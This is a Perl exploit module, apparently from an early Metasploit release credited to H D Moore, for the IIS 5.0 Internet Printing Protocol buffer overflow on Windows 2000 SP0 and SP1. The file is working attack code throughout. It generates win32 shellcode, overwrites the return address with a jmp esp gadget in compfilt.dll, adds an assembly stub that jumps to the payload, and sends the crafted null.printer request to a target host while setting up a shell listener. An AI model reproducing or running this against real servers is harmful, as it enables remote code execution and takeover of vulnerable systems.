use IO::Socket;
use Pex;

##
#
$Name = "IIS 5.0 Printer Buffer Overflow";
$Version = "1.0";
$Author = "H D Moore";
$URL = "http://www.metasploit.com";
$Group = "IIS";
$Description = "This exploits a buffer overflow in the request processor of the Internet ".
               "Printing Protocol ISAPI module in IIS. This module works against Windows ".
               "2000 service pack 0 and 1. If the service stops responding after ".
               "a successful compromise, run the exploit a couple more times to completely ".
               "kill the hung process.".
               "Please see the following URL for more information on this vulnerability.\n\n".
               "http://lists.insecure.org/lists/bugtraq/2001/May/0011.html";                     
#
##

my $pex = Pex->new();
my $pay = {};

sub Init {
    my ($obj) = @_;
    $obj->NeedPayload(1);
    $obj->Payloads();
}

sub Payloads {
    my ($obj, $opt) = @_;
    my $x = $pex->Payloads();
    
    # win32 exploit, load the payloads
    my $wincode = $x->{"x86"}->{"win32"};
    foreach my $s (keys(%{ $wincode }))
    {
        my $name = $wincode->{$s}->{"NAME"};
        
        # only load payloads that do not require admin access
        if (! $wincode->{$s}->{"PRIV"})
        {
            $pay->{$name} = $wincode->{$s};
        }
    }
     
    return $pay;
}

sub Check {
    my ($obj, $opt) = @_;
    return "No vulnerability check has been created for this module\n";
}

sub Options {
    my ($obj, $payload) = @_;
    my $res = {};
      
    $res->{"RHOST"} = [1, "The target system's ip address."];
    $res->{"RPORT"} = [1, "The port that IIS is running on."];    
    
    foreach my $popt (keys (%{ $pay->{$payload}->{"ARGS"} }))
    {
        $res->{$popt} = $pay->{$payload}->{"ARGS"}->{$popt};
    }
    return $res;
}


sub SetupPayload {
    my ($opt) = @_;

    my $payload = $pay->{$opt->{"PAYLOAD"}};
    my (undef, $parch, $pos, $pname) = split(/\_/, $payload->{"METH"});
    if (! $pname)
    {
        print "[*] No such payload exists.\n";
        return(undef);
    }
    
    print "[*] Generating payload " . $opt->{"PAYLOAD"} . " ($parch, $pos, $pname)...\n";
    
    my $shellcode = $pex->EasySC("\x00\x25\x20\x0a\x0d\x2b", 900, $parch, $pos, $pname, $opt);

    if ($shellcode)
    {
        print "[*] Payload generation complete (" . length($shellcode) . " bytes)\n";
    } else {
        print "[*] Error generating payload: " . $pex->Error() . "\n";
        return(undef);
    }

    my $listener;
    my $handler = $payload->{"SHELL"};
      
    if ($handler)
    { 
        $listener = $pex->$handler($opt);
        if ($listener == 0) { return undef }
        return ($shellcode, $listener);
    }
    
    # other payloads fork to maintain compatibility
    $listener = $$;
    my $exploit = fork();
    if (! $exploit) { return ($shellcode, $listener) }
    while (waitpid($exploit, WNOHANG) == 0) { sleep(1) }
    return(undef);

}

sub Exploit {
    my ($obj, $opt) = @_;

    select(STDOUT);$|++;

    my $target_host = $opt->{"RHOST"};
    my $target_port = $opt->{"RPORT"};

    my ($shellcode, $listener) = SetupPayload($opt);
    if (! defined($shellcode)) { return; }

    # jmp esp in compfilt.dll - opcode database cross-referencing rocks :)
    my $ret = 0x732c45f3;
    
    $pattern = ("\x90" x 280);
    substr($pattern, 268, 4, pack("L", $ret));

    # payload is at: [ebx + 96] + 256 + 64 
    $pattern .= "\x8b\x4b\x60";         # mov ecx, [ebx + 96]
    $pattern .= "\x80\xc1\x40";         # add cl, 64
    $pattern .= "\x80\xc5\x01";         # add ch, 1
    $pattern .= "\x89\xe5";             # mov ebp, esp ;(not necessary)
    $pattern .= "\xff\xe1";             # jmp ecx


    my $request = "GET http://$pattern/null.printer?$shellcode HTTP/1.0\r\n\r\n";

    printf ("[*] Trying exploit using return to esp at 0x%.8x\n", $ret);
    
    SendRequest($target_host, $target_port, $request);
    exit(0);
}

sub SendRequest {
    my ($host, $port, $request) = @_;
    my $s = IO::Socket::INET->new (
            Proto => "tcp",
            PeerAddr => $host,
            PeerPort => $port,
            Type => SOCK_STREAM
    );

    if (! $s)
    {
        print "[*] Could not connect to target: $!\n";
        exit(0);
    }

    print $s $request;
    sleep(2);
    close ($s);
    
}
